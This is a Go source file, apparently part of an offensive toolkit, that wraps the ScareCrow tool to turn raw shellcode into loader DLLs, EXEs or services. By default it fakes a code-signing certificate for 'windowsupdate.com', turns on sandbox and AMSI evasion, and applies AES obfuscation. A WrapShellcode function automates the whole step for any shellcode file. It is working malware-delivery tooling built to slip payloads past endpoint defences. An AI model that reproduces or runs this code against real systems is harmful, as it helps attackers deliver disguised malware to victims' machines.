package tools

import (
	"adpack/utils"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type scareCrowTool struct{}

var ScareCrow = scareCrowTool{}

func (scareCrowTool) Name() string    { return "scarecrow" }
func (scareCrowTool) Available() bool { return utils.ToolAvailable("ScareCrow") || utils.ToolAvailable("ScareCrow.exe") }

type ScareCrowConfig struct {
	Input      string // raw shellcode file
	Output     string // output DLL name
	LoaderType string // "dll", "exe", "control", "service"
	Domain     string // for fake cert
	Signed     bool   // sign with fake cert
	Delay      int    // execution delay seconds
	SandboxAmsi bool  // enable sandbox/AMSI evasion
	Obfuscation string // "none", "base64", "aes"
}

func DefaultScareCrowConfig(input, output string) ScareCrowConfig {
	return ScareCrowConfig{
		Input:       input,
		Output:      output,
		LoaderType:  "dll",
		Domain:      "windowsupdate.com",
		Signed:      true,
		Obfuscation: "aes",
		SandboxAmsi: true,
	}
}

func (s scareCrowTool) GenerateLoader(cfg ScareCrowConfig) utils.CmdResult {
	args := []string{
		"-I", cfg.Input,
		"-O", cfg.Output,
		"-LoaderType", cfg.LoaderType,
		"-Domain", cfg.Domain,
	}
	if cfg.Signed {
		args = append(args, "-signed")
	}
	if cfg.Delay > 0 {
		args = append(args, "-delay", fmt.Sprintf("%d", cfg.Delay))
	}
	if cfg.SandboxAmsi {
		args = append(args, "-sandbox", "-amsi")
	}
	if cfg.Obfuscation != "" {
		args = append(args, "-obfu", cfg.Obfuscation)
	}
	return s.run(args...)
}

func (scareCrowTool) run(args ...string) utils.CmdResult {
	var r utils.CmdResult
	if utils.ToolAvailable("ScareCrow") {
		r = utils.RunCommand("ScareCrow", args...)
	} else if utils.ToolAvailable("ScareCrow.exe") {
		r = utils.RunCommand("ScareCrow.exe", args...)
	} else {
		return utils.CmdResult{Success: false, Stderr: "ScareCrow not found"}
	}
	return r
}

func (s scareCrowTool) WrapShellcode(inputShellcode string) (string, error) {
	absIn, err := filepath.Abs(inputShellcode)
	if err != nil {
		return "", fmt.Errorf("scarecrow: resolving input: %w", err)
	}
	if _, err := os.Stat(absIn); os.IsNotExist(err) {
		return "", fmt.Errorf("scarecrow: input not found: %s", absIn)
	}
	ext := filepath.Ext(absIn)
	base := strings.TrimSuffix(absIn, ext)
	outputName := filepath.Base(base + "_loader.dll")
	workDir := filepath.Dir(absIn)
	outputPath := filepath.Join(workDir, outputName)
	cfg := DefaultScareCrowConfig(absIn, outputPath)
	r := s.GenerateLoader(cfg)
	if !r.Success {
		return "", fmt.Errorf("scarecrow: generation failed: %s", r.Stderr)
	}
	return outputPath, nil
}
